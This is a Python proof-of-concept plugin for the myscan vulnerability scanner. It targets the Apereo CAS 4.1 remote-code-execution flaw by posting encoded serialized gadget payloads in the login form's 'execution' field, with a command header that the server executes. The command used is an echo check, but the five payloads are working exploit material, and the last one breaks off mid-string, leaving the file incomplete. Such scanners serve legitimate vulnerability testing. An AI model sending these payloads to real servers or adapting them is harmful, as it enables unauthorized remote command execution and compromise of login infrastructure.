# !/usr/bin/env python3
# @Time    : 2020/11/26
# @Author  : caicai
# @File    : poc_apereo_cas_rce_2019.py

from myscan.lib.core.common import get_random_str, check_echo
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.threads import mythread
from myscan.config import scan_set


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data", None)  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "apereo_cas_rce"
        self.vulmsg = "detail: https://github.com/vulhub/vulhub/blob/master/apereo-cas/4.1-rce/README.zh-cn.md"
        self.level = 3  # 0:Low  1:Medium 2:High
        self.success = False

    def verify(self):
        # 限定根目录
        if self.url is not None:
            if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
                return
        mythread(self.run, self.get_payloads())

    def run(self, payload):
        if self.success:
            return
        rand_str1 = get_random_str(7).lower()
        rand_str2 = get_random_str(7).lower()
        rand_str = "{} {}".format(rand_str1, rand_str2)
        urls = []
        if self.url is not None:
            for path in ["cas/login", "cas-server/login"]:
                urls.append(self.url + path)
        else:
            urls.append(self.dictdata.get("url").get("url"))
        for url in urls:
            req = {
                "method": "POST",
                "url": url,
                "timeout": 30,
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close",
                    "Accept": "*/*",
                    "Origin": "{protocol}://{host}:{port}".format(**self.dictdata["url"]),
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "cmd": "echo {}".format(rand_str),
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "{protocol}://{host}:{port}".format(**self.dictdata["url"]),
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9"},
                "data": '''username=test&password=test&lt=LT-2-cZbwGIaGIX1dKwYcGivxcnBY2Puu5b-cas01.example.org&execution={}&_eventId=submit&submit=LOGIN'''.format(
                    payload),
                "allow_redirects": False,
                "verify": False,
            }
            r = request(**req)
            if r is not None and check_echo(r.content, rand_str1, rand_str2) and not self.success:
                self.success = True
                parser_ = response_parser(r)
                self.result.append({
                    "name": self.name,
                    "url": parser_.geturl(),
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "request": parser_.getrequestraw(),
                        "response": parser_.getresponseraw()
                    }
                })

    def get_payloads(self):
        return [
            '''4d7602b8-b97b-465c-8b6d-1daa34912ebe_AAAAIgAAABA8tXXbwGU%2B494WKus2I8AbAAAABmFlczEyOHXuPnUZRxfPfw318g2fJ%2F2tSm2MZa88OwCgdkaPqEd%2Fqx8mLPAQgb73SGbEJSMdXJ3F8iLcoKbBfJkRZSEprujcsC%2F727UbwmuKroAAwbCTzIVsO0yPbZvZCwsmClqepJYVz8YHslE7sxgBTNeGfIZMiONyABhV96lHZyKmomyeMDjZ%2BM%2BLQMCh3zAgadeUiSXPxN7S%2BNWGd9GFAtqZJ%2F4TRawRg0V%2BuUUtGWtyku9FilWB4q9IemZgXxgqz%2Fd69XBynyv3%2B8gLO%2ByYbXX0MA2dO9kw2IancHG%2BqJsyzA%2BetDvPCom%2B6%2B3WJs34L02H4QQD0xFFUWkEcMFdYYduogjr1PdS4KP1KMZZK%2BQ58f510vA%2BBsJ4ZY7jVKCHxhqUjs7LHpzbrhkQHUtnWz%2BPyuk7JGYfyCkyUtJ%2FHUE6cTk7sLkIrvbhr3k3mEv%2B9Jf4V1gSluj8DPksxdtTGKlhRwCDTLHWAl3T%2Biej%2FLMa8r5AzCmmT%2B6GaHmwdmESG3pJk5zCuPI6ms3CjWd1xcntgbPQSxtj6n%2FHBdBu%2BfCXdk7PNiqjTLI2NmQA9vr1ancXS18EVKztzPECsQCQjABQcOsxGqkTbe5IOcIyJyvgpeQn6HKKmd%2Bq6%2B95LU4fIi75J3Kips93XhKOWVviI7HuIDlW8FyPmVRTOrWalPd%2FPOYTISy2uSMU%2FidU3VN%2BlMYYn90uDrnf2YgbsYH%2B4A2cZOxui1YcePIIG0QycgekdjemSVYWwwDNXpnDPcJE1pDbEQOvMiBH8vXAV%2BqcSX1CoNecqVvifrgc4mWam5yFgIYdq0vOv71ixnjvYo7opp4dRzJXx%2Bmn82HGNiWifQ5tHAe8cGoDOEewSiLq0wroUhDhw0MhiSgFx%2FVeu%2BaFAS7R8CJS9xMWnwWSwrUDYmY%2FHGpAJUMvS%2BE0mNfdOgmOWFtYpaRiIKCWE%2BaLfAlKvXzoCPe%2Fg2g9ol7XcRlMNuClHiJ8Nk4xLg1fvwD2Lrk5l8rDxQoFLk0%2BNx6qQtHLercHZeebyjzljrYjmlgmlrTEPSYrH0MMR%2Bgxzct02n9%2BCEH4msUW7lzHJnSEfVPPBrB%2FfkVknVC2M6NgxJj39Kvwdhtg%2FS4bvsAmUjR3Agx8qXFWdhsdF9V94mhoYEnthrgqlhTAMIhmOoLil2NhnF4%2BYabeMS03QCOR1JEJPfdwa8rO%2FT8p%2FlN%2Bk7sk1MznEPQdOmWzFEGXM1R7YvXTW8fCrW44FHejeV5zIjYuPksB%2Fkqp1HM3TwhhrIbvEtCBRg9We0tSBF6jGDDQSd6YUEKyVn5KSNcjACyu0b5lSjzPWmmfkkU%2BCooL3bSNpxVMxF%2Bh2tV74gOIDfysYB4f1s4eO%2BTm%2FWgkOEkUfu90kgtN3zUxpBSJ62frzoqgcB9Uz5F8sNVoYWbz%2BVMP0DhtVUmP0pFtCuHs2SwpZtGcX%2FbbKhiMZSCNGn8rpC%2Bu2KS7Ntfy8yAxgklj3rh3XcfqNyGTj3qKGe74lkgzkKPkZITGl%2B5dQ1D3Bl1bffiAqRFgQdAH6aU3Jqi1KVKJCsqIc8JoJ33puUgVMEfJeP4u%2BT7WPY2rbZlwrpC%2F0Te6n8fLM9W0nTFSbTeT%2BijjhOEDMrNRSA%2FTXkLmxtYqiz%2Bw9Xi%2B9yqXf2lWEyXhm%2Boa%2Fea2dJz2Uj8IxyLVDJX%2B9CubjqKzsZjpVUcPxjLmeDvnOJjzH9gFpspTMjiOIp2yPSskQolbSnJrt30VQG4IZA6q6cdbz9cflvYFM%2F2H7GQMvgsctvu0U%2BgJX7y1y83B0NKeCVTeOG1tRHxs5Q7oaZdSWXCV9OIptJY5UDHQ5pPBGRVYSRHakSZrEHBGW0ZHoyePna4dhk1XLra6BwBr%2Bf%2BzWlRZwCDJww0XmIMiYU44LRal1V0eXvtrQFK3eTLeENQdhoPJJFlwflvUxfH%2FzgPVW9zX6dybCTkcqnLyLnf%2FkANDs8cykbaeYhBmScX7Wtc8lFLBngwlvo1Zb%2BA44lCE9TkEiW%2F%2FcDX9z1x7jJuib9RVO%2FzZt27KLw55uRmKW3dAA9m4DTNj1tJkdGlrlgRk7ASoi5FftbdMaIs4CNDvtM%2BO4Pf8sNvuI7PPAkNRZODEfIgsUcUSPTL3gcQhJ0kX3391mZKrDIu73JoYdj5Am5gUQ5iTRwLqyxIFSh6Xnzb73mQZyhYDOe6q5Ng%2BEGKkzJ%2FcHH7g%2FO0LtyisMwJzHxDIRV3x8Kz9S1FL4EwnKeshujvw533ixQ7WHjqUH3P69ObbbT6XTRGHpXiF6Q3kAJZxBetLl9Qg3gpGTmgPdCWkdDla2%2B5%2B8I1N0CiG9TiUy9N%2ButIl0APR0nHxTmQ8MT5uBIQQWdM8f6uIgR%2BWsRwgLPufeeTlmA64%2B7uy0XzsMAAfFqII%2BdUKtHuSwfoW8ifFFKzkM0TPl%2FskuNpAUXeYQ1D1XNqX2e96bb5IKAKLVRbOJu3D97UAG5nK7noBPkkNfDvSGBhNpmbSVOBs%2FUaM%2FIIks4db1oeY9RHjWYwQcJ33t%2BZYquPiegEp4I2NFy1z%2FY8n7%2FlO2M4riQbKAUclqPe2m1yhs74cN9RQDiECq6NK%2BKNylqqTRG8m1iBNzKWaz5kFLzEaGcVYS9uchC8URvIS2i0VFo%2FKQf1x%2BeFnlrdAk%2BDLttiWu6DFcFfDHrDogoldGxwefoGY6Qvqxghh9DYQroZs9Is%2BP3eFFTaC7HvREvhHs4YiiVihWXcsusw1v1%2B0aLOGG%2FOX3thdY4p064wyeeLzv%2BOkmWDBYKXbQC2a63A%3D''',
            '''5e9ded12-629a-4a6d-8772-c37a343ca307_AAAAIgAAABCxGBOIAzGehh55Zg72tbYqAAAABmFlczEyODzbTDaYcVtvlf2sy22K9Kp%2FcEo143Lm7rbZbLB0PsNjm1o3XATbdc9TjYWxeO4edTicvF%2B1QWRPrE208QEX0g0w5BAilvU2Hz7C%2FCIo7pyPQTwpt3qPEBkIEoG8pqtphhl5fYilfydYXXDn2HBiPOfKAfuLY3yCamis1QJnBl%2B4poaNMHLP8wM%2BmD9%2FAkHOzOo1uqyKwfknBT%2B5hhLP%2FSWXgmzbhQFAROOanOuvXQC6o4iX0BmFpcC18mvo25gijTLrdHOvmuvvbiFxlT1%2B%2FeE62q0Fs%2Bbrl11P%2FDxjZ3H1Es491B7wfTx0KIl6oRtXNNliN83QZO%2BVG6x%2BsOTaOYhAgSOHV1ACYTEcd7HtOOp4SGfxAnyqjzZl3K%2BKb3mCcFzm%2BxH4Jo2rLZTeb%2BOmXiVIAm6MmfJQjp0JWPW3DtT62zmkraNsL74brAhHcHmP%2FTsIhATf%2F5wqwjLQb4XxdI%2FmRIZ2YUqEafMpvTaClacj6jY0uW84UFI6MRLifcqZNgv8Yh3FDjML0bCwKgNLJ0maD2IrE5ICsy%2B%2FNyXdT1CUG9TcnTduBgqVwzBDqCE1EANefZ65vV4OpK6op%2Bk6C0%2FVNOrOXNUXevTUySt757G5nEuRdiuUxVJSblVW4ozahYHMwrNw5x5rd9Un5iAe5z20fit349VFUotxZeFlcMK11hcjx9pn8pJzNptcgfqKSiQnhB6JmmTT%2BPqSEi%2BOgh1NqHvRCji4EjXQ50XFFtexVXmPf6ZFwytlxyUnH93evIYXRjtGd4p2yMYib8VXacv0ptV1spcdugMC0Y%2BpyHlydWyh5NtHGe%2FCWRmQ8eWMySF4YxTWe4YURGDLPLcAwHtdtwgbQ5ZdHQUAOlLFvDPh1U0HIFzTUBscpuBuAnaov%2BZ%2BtDhL19UjyXSl8acEpY9uFuugZ8ygfz5ppyaCRWBdj4UuqlkBBm9t9nWoKEvh%2FaTpXi3vy1GFfJPk5Ai0qSAbSSy5veVHuaT9WmspgzizlTIC%2BoDn%2FknjAlGH3ERE683QRDyE3X%2FOypI%2F18WmmwQsUq1OJK0s3koMbUu5gCkyx%2BvFejLrfDssBEBAJ1PmhmFxN%2FHAFmzd9f2fXO7ntQCdfMCZvSONpVBrrQwL9SyFnMwieXJZonmNy7y1IIqfkk7Sft2Q3o4q7MfFkIIV09OrBnzT5%2Frc2a6vYmmVSP0I3lxOAYDfPZajgc%2Fz3XiuPCF3ATat%2BHLF8HEBD5EmSFUqA2snzmy4g82BOsdRclXa%2BZx8yFXGKV1Ynr6kr%2Fjo%2BP%2BAkasgk3EYB3b2o9tub9o9DgAL%2BSaQyR%2BLWwVF6aEe7%2FHI1I2DZxiE5uYsz4o7BCsnJiSRSCHF9TkTaQNE%2B9qQMcFtwHQbqKIdQRHY0QQtw78pdNp8P6LNIc0Msncp97dddyZwSDOyGTn0qWFTwDQngakYmmM6P6SiiiiCk2bFbxDs3ACVnMo93zk%2BlM93UizRiw0vQWSPAzRMH0%2B3Hkx55W0ppPNORx2syskOHNgZTTPunpGeNL%2FKPlKbkRCpAN%2Fqo%2BCJFUW18hWIeIcAJbwzwa7nZI8cQjPftKSkfDLO5pHde%2FkF32xvz0YMORAV3UACcJBErndLl80jey%2FN2x%2F33toySn7jo4prBwsS8iuRV%2Be8BLv%2BdZRQkBG8wsQHsXrQC8Dyu8zfh6oug1whEjwBsszWYKaS5XU1ryeH%2FiJE%2F%2BgJMBGQM8oSK2czSlHJjnX6%2BUozyPOST3nk1E8nFZout59It9scw4BF8oxETqiGqO8%2BHGfmzxxoMjFqom0HqELcAjFK%2FUfSAVZLeL3XphPEDVUPr9OGPO%2FLVgoBW8yek7FFpYP%2FLOwyIBw4iwLoTUdznoZxqsFIeEhmB6u2kyrNgvW40ud71QqX6EI3Js4wzXxoxuHT7UNmu3WPvK7dcMzcG1zoMbE9mMYp9KGjbubDnfcIHmhHAAPlrY9Hb9mWvuyj6hMe7TSKX%2BqAY1UMWFkmdMhqGi3HeSmP8HTjR%2FEwoAYPCLaHpKPedW6kC7Q3HWo6g3VLb%2FERXnATS5XUc251f4ax9XCpbUTO67TD3bgORtJBqSA%2FB9UdU5qBM1dq%2FxyWyXg%2Bi7ReNJ7SFC7mnkfbx3IAMh0feECYBZXq6yA9D5j0dYKtRM5dYVO3i3HBHKS%2F4l9scuzrD0sxGkRs8WLWM9x7NpaCX%2FxUGX1f7mfLDYu%2BG8v0tpcRpY0RnkNqAAwXC2L0uO1Z4iBxLYG0Y3KbwQtDtig6Er%2B%2BOmOprodI2Awqc%2FNAdjUgQ46xdCC5HB12gDsSpqROXfRF04X%2FDZuPDz8vqdkTnUcx66JkNdHRzN51fVWqzsgRljLqlzSfl%2FmO9FenQ04HrQd1ed810h7%2FEJB6Ofqhfzyoi5UdqgWHCgrwvNw68pFXGtEL4Y7xzy%2F54KkHAwmE%2FMukpSPzzi6CWXeUXFCT6olfNqPcAXQzlo1Io0JdHCEDs6uKliJ0GnZc9hgoDZQ8N5aJC0q0DyJhUR28axM%2Bocr1DmPkN3edJpQpGk%2B4D8Yfka5d0v1bJNAJXAs5932IIW0%2FocNcDXlQheR4Rf2oE9gn%2FvnqaY0XrPw6UuRWVTzn7ya52RRjdfF685zDFeVtPq3wcKaKywYzhU61xlBsLO0a5Hfvq0A%3D''',
            '''7f8c7126-bb73-4347-8ded-aa226112fa41_AAAAIgAAABDQHMHmGw4y6u2isU8iAwfZAAAABmFlczEyOKFS5hZ9Wgtwlvtzwl%2F9k%2B6uIaI0yT46L1R4wnW4qt7m4%2Feqt0Z63SCHdryrjOaR343E%2FyY5FvwJuZriI%2F9LrtU9NQP4nRokpIJTj5qD4clPdRGpIutBwNMhHHGyXwUUBHKRqkdZp4xSNzV%2Fi6D%2Fp25TzpIpWnfsylIDvdFfSP4y7t7Xfy6midU5UrBBmWC%2FbYrZYE8u%2FY1EsOHmNFUA4nHE4XGDTiar2cngsHF%2FgqmmKfpvj5lNupQa%2Bk8B%2FIqROqnsTD2sdxKuo1lAkcxMvjyYTR%2BygmP8Bx%2FA3Q1xkW16QZTuJIX1n4negygGLeSID8MvhYnLNXanKeKJ5ES%2FxY7HIJpf1RHBRzIYCREiQ0cfpeZC0eA3mVYiCe1YsC4SY7aypkLJv4pC2zufbvcfIXjfLAdbdBsALcVt3xNLsns68Mki1Jdt5PNUejbi5Cyfk6BNv9ETwmDd91XEzCwLl5Uh15jBoZBrb90aZ45ziyJsDgQ3gE2IDHzVVZJYLxcpqcwypsuCqDgJvduajiCAXStU2uxskr7LyskYEu9JfxizwJ%2FXLyxMpZGi%2F53rxWxX02WdyWmXU%2FiRHS7jVmuWKXHsssK6CFRb7JFtB1Du7%2BRp%2FxPM5Lsp0pXcMjt%2BxbKwau0Etxjf8ILcd1mGBFmgFJGpVttsLw3dO33H1HIlvDiez26pLUXmQhh%2BnkwsLxnBj3SKYNWrcKSuL4RA3zrfnhO1cBJ0TShDfx6Zp6lH%2BW%2FGqKdM8qNiqMLV5ES0fQBAik3qz2vAILRTDb3fLtjrUWFi3vhlo5BJFRDPsQYq0PUrgl2Us%2Bqmv0tZ7gHyWsifEkUTaDy8mUGvJ40h56Q%2FAIPuebivHzmErU4kcZ0r%2FOhTxd2m8vXLF0d8O6p8nkEUXC8T%2FbazgBmijxko1e7mfqNYsWuT4zwke5NP%2BIJOiyiuyvG%2BXDf5xpDLLJI%2F%2FS2iVZXjnNCAVTTyoIVozvTxg7olig0lT6qobsRRjRT4YP7rt2AWUMhQ49aynLdp4nDr2JN1OiYGtGsoiDjcuKGBJjtJojBC2IJI7brJwOhBP9257V9WmOuLnjNL%2FL0kMxzuSwp%2FAwOy0%2FjM8Xlj8mqFHJh83w%2B52lhLIxpzDEIasFcHku%2Bx6x2qoBeo4A6XEOoVey5RbDEi0dBFveWBi4sPFgl%2FWUVz7BszauCePZ7%2FXQ5gL1%2BMHPuAz6sT48LaafPfjWOCvjPoxI%2BMVtfT%2F4qgUvKG4%2FmigVDrXBdkw%2FDjiMnNHOmYa9nqFl31prEiQSQVDLtEAOQZf8VSzA3P3LkJ0gJoMs16nl5x3xG0TI718rH2AFHBr%2FHatH11V7wkmeW85NUJ4fItp4EZDBcoCC13N6emPCmuTmNEDmJSs9fLIpixoZL%2FFofuexDP58r%2B9HS7fqMDdWkA2EVnmRs9geFCLoFOlaQyrFfaC1WRoRUvqUKwcDwXYLxmDb4TZQfwy4BZuojAiuZenssZqE3ciI4LXeE2yVSUzfJb0a1x4MF1vm%2BrHfYP9n5S92RKAkrktF%2BdocIDiI%2B3AOVqV3J%2Fywvt4C%2FqIN8YZzmsWg5kIInlMwS4Rb%2BvUj%2BgNp%2BFLOrL%2F%2BJ4mfUO0Dryjz44Lir5Qg9GWamccjIhnByb4HfxNvda10Nmy8OBvoY9rOL8PGx%2Bg6IRXZ%2BOpfAkD5mBsUWhXYVfKaYe6DcsdblTPKrsb23OldsWfoSSAKXfH73%2BFXgmyYXGbv%2BMdhy3GM%2FDJ6q%2BmlYE81Y1kP3%2B6529jI%2BLYPAL31JwMANyPl5%2B3UiUJDe%2FnCAxzhlLPf8IQskLittQd79rHklOu%2Fw0I%2Fwhzfy1gK4pfWr%2BF8WR7fonls2QlEk9yHbWhFay98rBIiZJKjaka2p0S4Dk32%2F1Rr2DOsomN7R0M%2BrmzgpPYXhbhsWh3E7%2B%2BwXAMTr%2BsDTy9606Y%2FsTDQTI1Vt671FprD8ZHVow9vf0SCef8gXsnPW%2BQPmShg%2F5bV9qHs23TArOs30ok%2Fofjd%2BhA19d5%2FhLmlAeNr%2Bn6%2F0LrGE9eRxM%2Bf1VrHHH%2FKIu2CzyqUUaGwLTy%2FxRxXwysjYd6vrWsWRLnapyZFUrbbuHQxRGNCIVwC1%2BbIoW%2BM9nq6fiR9P8Zaqjpvb6f1Eqo%2BOXtk9cAT8OEQlyK8zpFj5rcKCHc8uzlPi6fqhtfIQHw3jtGsXE6CGVfZ2AR8LbO5epSDJLOgZ1QvqyD0e%2B%2Fg4CBv%2BOO7pOxdmhjoN3dN97yQUAvjFkHFYh2sJtIKfiRP9KSsxnlvF52wdWLMqzUwUBJ3QNfwDOoZuF%2FZZjYgyoYG9b9SOVCEq26Q2LysozjiCbcx93kt3wnsodmsTlKNGY38Ivg9G%2B%2Bu39xHX7kh66BLaas9VPLwmTHf%2ByeOumRS1pXh8WryV6RTaE2j9tNzf%2F0NEgo9VZQQwKoiEtsS8HFO0twImSAHMAgqFsOKt51JaR9qbbavAYQ4PlI1%2FEQcQOicOAtoIgR3ALFUiCvlgGkKQUgUhZQ5vjuB%2BjNgja2pMWbTDv8MDYsnI5ocHuQWw5CnKwkhsWKB5xe5bDkif57hMLCkPghqzZK%2BuiBgs91FZ2eEY6fAobRNGMElaTTsfB5oAePTKHcgEN%2FNCZU8uLcBKY%2BilwORcCgud7njJgYVRe6gupgK1xjJSX65PPk4CU%2FuSU7L2hd9f9K7nvgp8hjEHdo%2B%2FFXjtc1bCUmwRHg0LzT%2F5JSC1nAZIF8%2BleMzzATw5NuXJSOG1mczmPHXegOpXyJ0L4WuNNvBG05ckOEEotSzew%2Bb0bIsENB9KlPrYDsC%2BTDiUyVIPJ6SqmudS2H7y0aJmtXFR5emz1h9THEZlX9wc%3D''',
            '''ae98e65b-03b1-413e-a540-eefa030ce98d_AAAAIgAAABBMv554SPRiO%2F4epX56Z6AFAAAABmFlczEyOJXeNGhtv8aeOlCdCs1O3PgiVDsZANmYu4jlrGtd%2FROp4OO8uD8zOmkVzjZOsaL8pK8BPtm2pkHJLAT1RNLRaE9x1rzPCIHdOiZRYCsJVDt%2FcChf80SRY5B7zwXxKM29fsPJn11EslrZwsxatlCVw6g%2Bs4%2BU5hwlHK43HO5Oe%2FDZXl9WgR4SXAt9xl%2FJuD1xKmyS3l44z6gNkNFBswrRRctqIAvDKpe9p%2BXUYWsNvoa%2FWWHa5Woq6NMBIUdn%2BMD0W9wl8eDXVcJjNSiNFjT7P5AO8gTEy8pU%2BtNdIrDYURiIYR73%2B5B05jOhK%2BJbVva%2FJlyswTJvgxmXHocYHjKP6QDbsvdDOcSdAVUxxhD%2F6YudOd4wGGtF86lnBlViqUYBZMnv%2ByA6hpAX9taKaOKAujJHMG2LRvKWRx%2BltjqMxdE2h472Y6iotfv4Ayh9nLKg1iUgoIkKFwRzBfnO9TfAEL2L%2BWbgFhH39whoVI6F6sT9jINES3O%2BQSNXHVPg0m0rY19noLBZNeSWzDVCnYpdEF9QmwzbxURtnfRh1Dg1M9DyxTh8uWfqDwuNipRIhhnXrH1Y7MN0%2FQ150n8H8DW3FLkxDLJICyt1bI1YDFuneQGTmpQaJCLnRqNVl05uSD9akg%2FSJekJPQ4fPPXN4I7%2Fo1W8XFZ0ID2NLOAditYQHxXuUP%2B0r7Sb09o%2BYwywqmQ3cmuV9rjYpsadKHTCBynktrKfuksochMsziv%2FYwI6Y2aKpb%2FU%2Fi2GhNYsJaZwe8mKAQueJF7zeFJZuh5SXoWY%2Fpfwyly0qnJ58x4YKG7Gsnt0byB6l1evEkBoYVcUq7iovOzuaeBMDp7xmY%2FZUgkcobIzEl%2BD%2FAnPJ9MOTBSeoyWzL7hHcqbV69Mtk7F60vW%2B%2FmW79SOQjG1wecoY7UukxrTkb579CAvhlwlDgmNE5%2FB50tolOW1P9VqWx8Hz7twJClv3jBqaNh1VgdLQOhEfnWRXTmmqNDXvqEJ99iRPI1JQRW8xXKPnYhqhFpNMFzxtmtWH421vHU61s4vOLtcFgPnmhekrd%2FNAZ542%2FmlbTHxIa3d0tlTutAjP0S8o0JUuNE%2FYpiX8AQvK0KD5v1Ah%2FgPFVrijaaSWUXAEBJpb4qrUd3zUgaVglNY7VON%2BxvIJWCbN26uWa5E4yyaqKXyWnPNYCoZxbc7bnidFZIs%2Bb7QWqi4nfQGinPcayaR1VaBGTfqdU7cT0AOjalFqhd%2Fnwrqgl%2Fgz%2BBm7ynC%2F8c94R5Yr828j3vMeWC8lMognWx%2Fsn4vrnKNMMd8W%2FOGuZXLBuQbFs14uYOv6BWRviF0xTKcV%2FvwqYcOSmTki0ZXsSxxSk7XN6mT7j3lgM8vnc6RSDx4BZJk5la%2BWgBYK2K2vnHdW7Z4qoZd9mdXwun%2FaAh1Zhvtxw0fAZc8PYYObW0%2FgIWaLq4FErnhKOcpFOnONV18ohvSi2oEVjltaVaY%2FytjRLpnw2%2FIgRo2aYSe8QC2SdVbAte6BgNrC3VTdsiAvgjIfG3772B2rFroKIFHnZnKh%2BQLXzArOA%2BZBpdGWVm8rO0cKEjExIBjKkqBmSBShq%2BR5IjvxlA%2Fi6rIJ6%2Fya%2FEnNAjRbHVNIjVQxvypfIVaaQTzySq5LBJpFVvzcpzNuytAodIj6Lcqh42aMdnsY25tNmT8SzJTH8tCZB%2FHFExlyXIB6GWLk6feqYsZIHv2eEUermQV0af3OXevATs5LCHWhb43nBfnmhEQFdaKlDfF5sf%2BBb90rRzfJNDgTFdo7XTP4wfdmrqUAwJrf27WywsLG2iUYim88tWOXQabBZxg5V9n68SCgiQbiph%2Fz0XKpdhGcO1VnpbZKXEWiH0kiY0hwiSKnVLR1n7bylQGPOppm4s9FIss60QSoF%2BYQ2d3SolDDxTe0sqjHmoUHwi59JwjfvjZ1zB1nqzysdz%2FVHTkFjdx971QgLwEnfWbH%2FaiwCkidrLODAOLwvlYh2NRiQEdBQqkq62CwTR6ikjfGHPPA1KjgiRarBymdV0RGvaOClfgKazXMylRzkzyF%2FjJYVWtEtNhjIrxRG00SzlnGYzNs86II0dlQvdtUAE9hpPQYb4xFdjowxDD5ZJVVzL1OJ0LwPStgO43UUyIbAF%2BpM7JyV3BzkOUOdRdb9%2BZFT61pLsoNVw8Ged%2FxLy%2F0CUoqm3B6ZaJ%2FFirpSDUzHe1YzRAtfSu7D%2FqeYuqvyAOLqjRj2GZmzsMYD%2BeXmkIygfh9VvxFkM%2F%2FN7e5uvF2ViDgMbJfTJRMO2%2FdOG22XXxOnezqayB%2FOALzoAmzcu3wuDr8dZ%2FVi9i7W5%2BGBnNPYp22a1x7OhdqJUHSp6N6zRd6b7MimkUrSYzx7WBcAd%2B2I4KIY%2BekkK9VNYUgVeSwTxNcSOKzH7HyrjwMocpYiRfqqJaGo8F3hNEE9aXRTUOXis0EaCnqLs7y6rJMTOChrdBbHhrk7bk9jd2Ed23zgKg0JzOgvuWhGPzVq1esH0kt0z%2FmnWFwySuA3Ohqn%2Bh%2FpttrvPdWKb16dsyHXMvlH3xJBIjN7ecRNweQOhskULk8ABrBLByRC2tZde7gSTBwmobAG84MSX6hdp2iZ58nkYJz1KX9nQVbQ0PTo%2BbpSHUs1F0xeh3242jZTh1JRcUA5KGyeCl3UilwAIZb5ONyvJ9pyo4I9TOVgrFjxuc59N%2B%2Bd%2FWp%2BJ7FEBeKv31v%2FnPwXF9rW0ezRnbGlp42%2BneStHSisPxgYS%2F8TuXxktzN%2FrkCSiRD%2FHpuXnWuN%2FxY1u%2BKnzCvCpGCt166YzRdDpT1tIVNXID4L9SR''',
            '''252c8128-8942-4c51-8125-9457674b8e31_AAAAIgAAABDp9e%2BTi9D2rCJ7qc4vVnA0AAAABmFlczEyOA%2BUURfjejEgNuis5LKkJMn9Hdhh5nkgwLwS7WP3Be0hZsgcQKcjFdX0AJt9EaiBDL02DCpU132%2B0HcCcxdjBzTJbPSfWDXE4eq5SD3SE6eCXdQ%2B%2Fq5Xr%2BHPFqH9oJR7pWW5XWQDAjlDOEPoOfSvBTPrd%2BkHO1vXF50p65DIcR13LTivYDA2EH3dZY%2BGTm94APgOtTGOrq21D5bLo720vWET6DjShIFVJfNa3puhZERmJg3GUDhB7GvPaoke3UrKj%2BLn0eOKWQuX49FL3wJFRTzqCOPEd3caBHjZ04QTPIPIRyI3%2BqhrZ3n3vabuygyUDUVnck0AlY8V9d%2BShPqiFj75Dku7P%2BjjloSoqQ0bjbe4kLoIFqomvpdOB3FQNOPA4G6zgGwbvkTr0h%2F13mWj7FT5nbMqe6P8vBZPFaQhGEef0Ir0nZXyioF%2FCAhadjo9TTdmfTeFDN6yblFXr7Ed4baHvyiL96HXxav6x4F6FWNnqqy%2BR9M3CX0uYsbrZf%2BhGOoTcYMnKiR4nEMEr%2FVEnB5HQCa9ZGV2J81AhW8oc%2BTNWh4eTU%2BpuYQkPAN71J9JsZxCKjlDu1jgVWcJWILogL4OZx7m4L%2FGN59Ryr7%2FGm8AoL9Bp2aElk4gzXwOc7GtKp9OiNp7p3F0SeUKOH6yQ%2BT266Ruu01cUAy43oc1K8BXN%2BN45H%2FNrg9Rx4wmDKcHN8U3W%2F7TtGfw2CyxFsOsbID2%2BUz54pnepkuEu0bL1tK5mnSXQfzN5feBvmjkc3Sz2Okn1TzQKZqJqRKC04PxsLjnzR1kB6vWXfVgO3QpaYhpvwdb0jP6LmXfY8Vzl78Q8lp6S8wHe1J1SjreW%2Bf321hayYM1%2BBahQBjmwzH72GixeZneU9hXIByNK%2BkEshVlM6Hs98cnBz7p2Ir%2BKBJsxckskdw5ltPzdhVNs8tmkQs4Kf6mT1%2BpsI5aObozpfP4M18ql4aPFxTYUgUb4VoDfve5BrD1OzxBDBtr1zWawEh%2Br8UdMzVOhWRWVjw4WJa2TluYn313JF5bAlSnMYKC8omUf3mXPz%2BxMS9i%2FTOC7tK6%2FB9c4x5g3vtNLEltorhVDd0trY2BeFF0397Mriq2MGfS4w%2BChv2kxFGM1aFMjzonOKEhRoAFm4bcJYGbOhPR7CupCdjiaMDhaLR9lcBOswAO8yD865H3%2B%2BQqbtpsHeAKgaVAo%2BKLu7ALqIJWt4U%2BXnga%2F9teV%2FUMFs0uGtZfAiqLRTlyVJgOnJ8DXWWwvIGucL9pijlQmT%2FTtYV%2B51PnJf5pVME%2FRoMnaZWn4g2soWOR8zycmg1fBn6Xarg7RhRvhrS7VwS57FGsQMY43yRn1%2Bq9Q5rkDtG0SUquKRbGsjz%2Fec9iesT8deBvR29ZDtOMcy%2F5f%2FT8oR%2B2I5r6EHf5OUUXb8PqWZ6MmGStjEfFLYhpHKR5DUh%2BGShp3%2Fh5rzcUOwZdbqznrdyP87itR5mAum4Sg%2F4epa7UnGRkn7Mk7ZpX3uKFI7cdQiypzqHrmlZoIzBTasr5LSP1IS%2FisVloKiKMRC6XzoAVxRm8hj65Zy26Yif1ukroy%2FpWw586VRspK1ptucF443n3NlL9KTr3K7SHPifSMIqQ6s7zecqReu8bFi9MlCmqW9WmNRrLUhZp6aA%2BCwcJYR93KSyfVmmDngrZhClgx89i5itaJPgVsMVTny9rAwAWVGyQhG%2BEwdAa5wlXhpn2btiDEOuF77M9wNsHyN3rj9cQJpxgxlUAc4tb6rvPgcVbQXh94JV4z5s5IaZVyxQIPLACQ6JiicyACr86gChrcQlsCr6faX56nYecTDpw%2FE4X3g0m%2B10tebdgzAKE3O9%2BuptLkflnelJQfJSTJq1gDvrzdZS6t5xqoeSzuC3kb8uBLGd2dI20x285OFpqtlTVaNvvdU8karpwt3cNa1j%2BbEwFYbB4qCvuXzaiukA5kzdHU3nQYWGwAIXucugwb1zCH%2F